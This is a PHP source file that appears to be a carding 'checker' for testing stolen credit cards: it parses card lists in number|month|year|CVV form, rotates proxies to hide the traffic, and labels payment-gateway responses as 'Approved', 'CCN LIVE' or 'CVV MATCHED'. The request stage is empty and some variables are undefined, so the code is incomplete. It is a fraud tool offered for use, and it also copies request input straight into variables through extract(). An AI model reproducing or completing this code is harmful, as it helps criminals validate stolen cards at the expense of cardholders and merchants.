<?php 
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
///--------------------PROXY PARSE AND SETUP---------------------------------------///
function countlines(){
    $file = basename('proxy.txt');
    $no_of_lines = count(file($file));
    return $no_of_lines;
    fclose($myfile);
}
function rotatevariable(){
    $myfile = fopen("variable.txt", "r");
    return fread($myfile,filesize("variable.txt"));
    fclose($myfile);
}
function vreset($change){
    $myfile = fopen("variable.txt", "w");
    fwrite($myfile, $change);
    fclose($myfile);
}
$lines = countlines();
$variable1 = rotatevariable();

function getproxy($lineno){
    $myFile = "proxy.txt";
    $lines = file($myFile);
    return $lines[$lineno];
}
function check ($v, $l){
    if ($v >= ($l - 1)){
        vreset("0");
        return getproxy($v);
    }
    else if ($v < ($l - 1)){
        $new = $v + 1;
        vreset($new);
        return getproxy($v);
    }
}
function getproxy_userpass($separa){
    if ($separa[0] == null){
        return array('45.758.455.55', 'yoman:87445');
    }
    else {
        $var1 = $separa[0].':'.$separa[1];
        $var2 = $separa[2].':'.$separa[3];
        return array($var1, $var2);
    }
}
$proxyfull = check($variable1, $lines);
$separa = explode(":", $proxyfull);
$proxy = getproxy_userpass($separa)[0];
$credential = getproxy_userpass($separa)[1];


# -------------------- [1 REQ] -------------------#



////////////////////////////===[Card r3onse]

if (strpos($r3, "transaction was declined due to insufficient funds in your account")) {
  echo '<span class="badge badge-white">Approved</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV INSUFFICIENT FUNDS  ♛ </span></br>';
}
elseif(strpos($r3, 'card is not allowed to complete this transaction' )) {
  echo '<span class="badge badge-white">Approved</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED(ca)  ♛ </span></br>';
}
elseif(strpos($r3, 'security code you entered does not match' )) {
  echo '<span class="badge badge-white">Approved</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE </span></br>';
}
elseif(strpos($r3, 'failed - Expired Card')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Declined  ♛</span> </br>';
}
elseif(strpos($r3, 'The transaction was declined')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Declined  ♛</span> </br>';
}
elseif(strpos($r3, 'enter a valid card number')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Invalid card number  ♛</span> </br>';
}
elseif (strpos($r3,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Doesnt Support This Purchase  ♛</span> </br>';
}
elseif ($r3 == null){
	echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ PROXY DEAD ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Error not lisTed ♛</span> </br>';
}
echo $r3."<br>";
echo $Session.'<br>';
?>